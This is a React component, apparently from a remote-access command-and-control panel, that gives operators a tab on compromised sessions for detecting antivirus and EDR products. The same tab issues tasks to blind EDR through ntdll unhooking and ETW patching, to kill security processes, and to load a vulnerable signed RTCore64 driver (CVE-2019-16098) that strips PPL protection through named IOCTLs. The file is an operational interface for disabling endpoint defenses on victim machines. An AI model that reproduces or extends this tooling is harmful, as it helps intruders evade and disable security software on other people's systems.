import { useState, useEffect, useRef, useMemo } from 'react'
import { RefreshCw, Copy, ShieldCheck, ShieldAlert, EyeOff, Skull, Package } from 'lucide-react'
import { sessionApi, driversApi } from '../api'
import type { Session } from '../types'
import type { BuiltinDriver } from '../api'

/** ArrayBuffer → base64（分块，避免大文件调用栈溢出） */
function arrayBufferToBase64(buf: ArrayBuffer): string {
  const bytes = new Uint8Array(buf)
  let binary = ''
  const chunk = 0x8000
  for (let i = 0; i < bytes.length; i += chunk) {
    binary += String.fromCharCode(...bytes.subarray(i, i + chunk))
  }
  return btoa(binary)
}

interface AVHit {
  name: string
  category: string
  process: string
}

const CATEGORY_BADGE: Record<string, string> = {
  '杀毒软件': 'danger',
  'EDR': 'warning',
  '安全工具': 'info',
}

/** 杀软识别 Tab：向会话下发 av_detect 任务，轮询结果并可视化命中产品 */
export function AVDetectTab({ session }: { session: Session }) {
  const [hits, setHits] = useState<AVHit[]>([])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [lastScanAt, setLastScanAt] = useState<number>(0)
  const [edrBusy, setEdrBusy] = useState(false)
  const [edrMsg, setEdrMsg] = useState('')
  const [edrProcesses, setEdrProcesses] = useState('')
  const [byovdB64, setByovdB64] = useState('')
  const [byovdSvc, setByovdSvc] = useState('tsdrv')
  const [byovdFile, setByovdFile] = useState('')
  const [builtinDrivers, setBuiltinDrivers] = useState<BuiltinDriver[]>([])
  const [builtinLoading, setBuiltinLoading] = useState('')
  const loadedRef = useRef(false)

  const pollTask = async (taskId: number): Promise<{ status: string; output: string } | null> => {
    const intervals = [0, 200, 300, 500, 1000, 2000]
    for (let i = 0; i < 40; i++) {
      try {
        const r = await fetch(`/api/v1/tasks/${taskId}`, {
          headers: { Authorization: `Bearer ${localStorage.getItem('toshell-token')}` },
        })
        const t = await r.json()
        if (t.status === 'completed') return { status: 'completed', output: t.output || '' }
        if (t.status === 'failed') return { status: 'failed', output: t.error || '任务执行失败' }
      } catch (e) { /* 忽略单次轮询异常，继续等待 */ }
      await new Promise(res => setTimeout(res, intervals[Math.min(i, intervals.length - 1)]))
    }
    return null
  }

  /** 解析服务端归一化后的命中 JSON；兼容旧格式 / 空输出 */
  const parseOutput = (output: string): AVHit[] => {
    if (!output || !output.trim()) return []
    try {
      const arr = JSON.parse(output)
      if (!Array.isArray(arr)) return []
      return arr
        .filter((x): x is { name: string; category?: string; process?: string } => x && typeof x.name === 'string')
        .map(x => ({ name: x.name, category: x.category || '安全工具', process: x.process || '' }))
    } catch (e) {
      return []
    }
  }

  const scan = async () => {
    setLoading(true)
    setError('')
    try {
      const r = await sessionApi.interact(session.id, '', 'av_detect')
      if (r?.data?.task_id) {
        const res = await pollTask(r.data.task_id)
        if (res && res.status === 'completed') {
          setHits(parseOutput(res.output))
          setLastScanAt(Date.now())
        } else if (res) {
          setError(res.output || '任务执行失败')
        } else {
          setError('查询超时，会话可能已离线或任务未执行')
        }
      } else {
        setError('无法创建 av_detect 任务')
      }
    } catch (e) {
      setError(`请求失败：${e instanceof Error ? e.message : String(e)}`)
    }
    setLoading(false)
  }

  useEffect(() => {
    if (!loadedRef.current) {
      loadedRef.current = true
      scan()
    }
  }, [session.id])

  useEffect(() => {
    driversApi.list().then(r => setBuiltinDrivers(r.data?.drivers || [])).catch(() => {})
  }, [])

  /** EDR 处置：失明 / 击杀 */
  const runEdr = async (kind: 'blind' | 'kill') => {
    setEdrBusy(true)
    setEdrMsg('')
    try {
      let taskId: number | undefined
      if (kind === 'blind') {
        const r = await sessionApi.edrBlind(session.id)
        taskId = r.data?.task_id
      } else {
        const names = edrProcesses.split(',').map(s => s.trim()).filter(Boolean)
        const r = await sessionApi.edrKill(session.id, names.length ? names : undefined)
        taskId = r.data?.task_id
      }
      if (!taskId) {
        setEdrMsg('未返回 task_id')
        return
      }
      setEdrMsg(`任务已下发 (task_id=${taskId})，等待结果...`)
      const res = await pollTask(taskId)
      if (res && res.status === 'completed') setEdrMsg(res.output || '（无输出）')
      else if (res) setEdrMsg('失败: ' + res.output)
      else setEdrMsg('执行超时，会话可能离线')
    } catch (e) {
      setEdrMsg('请求失败: ' + (e instanceof Error ? e.message : String(e)))
    } finally {
      setEdrBusy(false)
    }
  }

  /** 读取 .sys 驱动文件为 base64 */
  const handleDriverFile = (file: File | undefined) => {
    if (!file) return
    const reader = new FileReader()
    reader.onload = () => {
      const result = reader.result as string
      const idx = result.indexOf(',')
      setByovdB64(idx >= 0 ? result.slice(idx + 1) : result)
      setByovdFile(file.name)
    }
    reader.readAsDataURL(file)
  }

  /** 通用任务下发 + 轮询 */
  const runTask = async (fn: () => Promise<number | undefined>) => {
    setEdrBusy(true)
    setEdrMsg('')
    try {
      const taskId = await fn()
      if (!taskId) {
        setEdrMsg('未返回 task_id')
        return
      }
      setEdrMsg(`任务已下发 (task_id=${taskId})，等待结果...`)
      const res = await pollTask(taskId)
      if (res && res.status === 'completed') setEdrMsg(res.output || '（无输出）')
      else if (res) setEdrMsg('失败: ' + res.output)
      else setEdrMsg('执行超时，会话可能离线')
    } catch (e) {
      setEdrMsg('请求失败: ' + (e instanceof Error ? e.message : String(e)))
    } finally {
      setEdrBusy(false)
    }
  }

  const loadDriver = () => runTask(async () => {
    if (!byovdB64) {
      setEdrMsg('请先选择 .sys 驱动文件')
      return undefined
    }
    const r = await sessionApi.byovdLoad(session.id, {
      driver_b64: byovdB64,
      service_name: byovdSvc || undefined,
    })
    return r.data?.task_id
  })

  /** 一键加载内置驱动：服务器嵌入的原厂签名驱动 → base64 → byovd_load */
  const loadBuiltinDriver = (d: BuiltinDriver) => runTask(async () => {
    setBuiltinLoading(d.name)
    setByovdSvc(d.service) // 记录服务名，便于后续「卸载驱动」
    try {
      const buf = await driversApi.raw(d.name)
      const r = await sessionApi.byovdLoad(session.id, {
        driver_b64: arrayBufferToBase64(buf),
        service_name: d.service,
        device_name: d.device.replace(/^\\\\\.\\/, ''),
      })
      return r.data?.task_id
    } finally {
      setBuiltinLoading('')
    }
  })

  const unloadDriver = () => runTask(async () => {
    const r = await sessionApi.byovdUnload(session.id, byovdSvc || undefined)
    return r.data?.task_id
  })

  const pplKill = () => runTask(async () => {
    const names = edrProcesses.split(',').map(s => s.trim()).filter(Boolean)
    const r = await sessionApi.pplKill(session.id, names.length ? names : undefined)
    return r.data?.task_id
  })

  const catCounts = useMemo(() => {
    const m: Record<string, number> = {}
    for (const h of hits) m[h.category] = (m[h.category] || 0) + 1
    return m
  }, [hits])

  const copyResult = () => {
    const text = hits.length ? JSON.stringify(hits, null, 2) : '未发现已知安全软件'
    navigator.clipboard.writeText(text)
  }

  const badgeClass = (cat: string) => `status-badge ${CATEGORY_BADGE[cat] || 'info'}`

  return (
    <div className="process-tab av-tab">
      <div className="process-toolbar">
        <button className="btn-small btn-primary" onClick={scan} disabled={loading}>
          <RefreshCw size={14} className={loading ? 'spin' : ''} />
          {loading ? '扫描中...' : '重新扫描'}
        </button>
        <button className="btn-small" onClick={copyResult} disabled={hits.length === 0}>
          <Copy size={14} /> 复制结果
        </button>
      </div>

      {error && <div className="av-error">扫描失败：{error}</div>}

      {hits.length > 0 && (
        <div className="av-stats">
          <div className="av-stat-card">
            <div className="av-stat-num">{hits.length}</div>
            <div className="av-stat-label">命中产品</div>
          </div>
          {Object.entries(catCounts).map(([cat, n]) => (
            <div className="av-stat-card" key={cat}>
              <div className="av-stat-num">
                <span className={badgeClass(cat)}>{cat}</span>
              </div>
              <div className="av-stat-label">{n} 项</div>
            </div>
          ))}
        </div>
      )}

      {hits.length > 0 ? (
        <div className="process-list av-list">
          <table>
            <thead>
              <tr>
                <th style={{ width: '38%' }}>产品</th>
                <th style={{ width: '22%' }}>类别</th>
                <th>进程</th>
              </tr>
            </thead>
            <tbody>
              {hits.map(h => (
                <tr key={`${h.name}-${h.process}`}>
                  <td>{h.name}</td>
                  <td><span className={badgeClass(h.category)}>{h.category}</span></td>
                  <td><span className="mono">{h.process}</span></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      ) : (
        !loading && !error && (
          <div className="empty-state" style={{ padding: '40px 20px' }}>
            <ShieldCheck size={40} />
            <p>未发现已知安全软件</p>
            <span>该主机运行进程未命中当前指纹库{lastScanAt ? `（上次扫描：${new Date(lastScanAt).toLocaleTimeString()}）` : ''}</span>
          </div>
        )
      )}

      {loading && hits.length === 0 && !error && (
        <div className="empty-state" style={{ padding: '40px 20px' }}>
          <ShieldAlert size={40} />
          <p>正在下发 av_detect 任务并等待结果...</p>
        </div>
      )}

      {/* EDR 处置：失明 / 击杀 */}
      <div style={{ marginTop: 18, borderTop: '1px solid var(--border, #3a3a4a)', paddingTop: 14 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
          <ShieldAlert size={16} color="#ff9f43" />
          <span style={{ fontWeight: 600, fontSize: 14 }}>EDR 处置</span>
        </div>
        <p style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', margin: '0 0 10px', lineHeight: 1.7 }}>
          「EDR 失明」：ntdll 脱钩 + ETW patch + Autologger 清理（不杀进程，隐蔽）；<br />
          「击杀杀软」：taskkill 强制终止杀软/EDR 进程（<span style={{ color: '#ff6b6b' }}>会触发告警，PPL 保护进程可能失败，慎用</span>）。
        </p>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
          <input
            type="text"
            value={edrProcesses}
            onChange={(e) => setEdrProcesses(e.target.value)}
            placeholder="自定义进程名，逗号分隔（留空 = 内置默认杀软列表）"
            style={{ flex: 1, minWidth: 260, padding: '8px 10px', borderRadius: 6, border: '1px solid var(--border, #3a3a4a)', background: 'var(--bg-elevated, #1e1e2a)', color: 'var(--text, #e5e5ea)', fontSize: 12 }}
          />
          <button className="btn-primary" onClick={() => runEdr('blind')} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
            <EyeOff size={14} /> EDR 失明
          </button>
          <button className="btn-small danger" onClick={() => runEdr('kill')} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
            <Skull size={14} /> 击杀杀软
          </button>
          <button className="btn-small danger" onClick={pplKill} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
            <Skull size={14} /> PPL 击杀
          </button>
        </div>
        {edrMsg && (
          <pre style={{ marginTop: 10, fontSize: 12, color: 'var(--text-dim, #9a9aab)', background: 'var(--bg-deep, #12121a)', border: '1px solid var(--border, #3a3a4a)', borderRadius: 6, padding: 10, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
            {edrMsg}
          </pre>
        )}
      </div>

      {/* BYOVD 驱动加载 */}
      <div style={{ marginTop: 18, borderTop: '1px solid var(--border, #3a3a4a)', paddingTop: 14 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
          <Skull size={16} color="#ff6b6b" />
          <span style={{ fontWeight: 600, fontSize: 14 }}>BYOVD 驱动（内核级击杀前置）</span>
        </div>
        <p style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', margin: '0 0 10px', lineHeight: 1.7 }}>
          先加载内置的 RTCore64 驱动（MSI Afterburner，CVE-2019-16098），随后「PPL 击杀」走内核虚拟地址路线：
          NtQuerySystemInformation 定位 EPROCESS 后，用驱动 IOCTL 0x80002068/0x8000206C 直接读改写 Protection（无物理扫描，无蓝屏风险）。
          <br />EPROCESS 偏移已按 Windows 版本自动选择（RtlGetVersion，24H2+ 结构大改已适配），执行结果会打印命中的 EPROCESS 地址与 Protection 值。
          <br />（实验性：偏移数据来自公开研究，需实机验证。内置驱动为原厂签名二进制，SHA-256 已核对；dbutil_2_3 被黑名单/杀软重点标记，不再内置，如需可自行上传）
        </p>
        {/* 内置驱动一键加载 */}
        {builtinDrivers.length > 0 && (
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap', marginBottom: 10 }}>
            <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', display: 'inline-flex', alignItems: 'center', gap: 4 }}>
              <Package size={13} /> 内置驱动（一键加载）：
            </span>
            {builtinDrivers.map(d => (
              <button
                key={d.name}
                className="btn-small"
                onClick={() => loadBuiltinDriver(d)}
                disabled={edrBusy || builtinLoading !== ''}
                title={`${d.description}\n设备: ${d.device}\nSHA256: ${d.sha256}`}
                style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}
              >
                <Skull size={13} />
                {builtinLoading === d.name ? '加载中...' : d.name}
              </button>
            ))}
          </div>
        )}
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
          <label className="btn-small" style={{ display: 'inline-flex', alignItems: 'center', gap: 6, cursor: 'pointer' }}>
            选择 .sys 驱动
            <input type="file" accept=".sys" style={{ display: 'none' }} onChange={(e) => handleDriverFile(e.target.files?.[0])} />
          </label>
          {byovdFile && <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)' }}>{byovdFile}</span>}
          <input
            type="text"
            value={byovdSvc}
            onChange={(e) => setByovdSvc(e.target.value)}
            placeholder="服务名（如 tsdrv）"
            style={{ width: 140, padding: '8px 10px', borderRadius: 6, border: '1px solid var(--border, #3a3a4a)', background: 'var(--bg-elevated, #1e1e2a)', color: 'var(--text, #e5e5ea)', fontSize: 12 }}
          />
          <button className="btn-primary" onClick={loadDriver} disabled={edrBusy || !byovdB64} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
            <Skull size={14} /> 加载驱动
          </button>
          <button className="btn-small" onClick={unloadDriver} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
            卸载驱动
          </button>
        </div>
      </div>
    </div>
  )
}
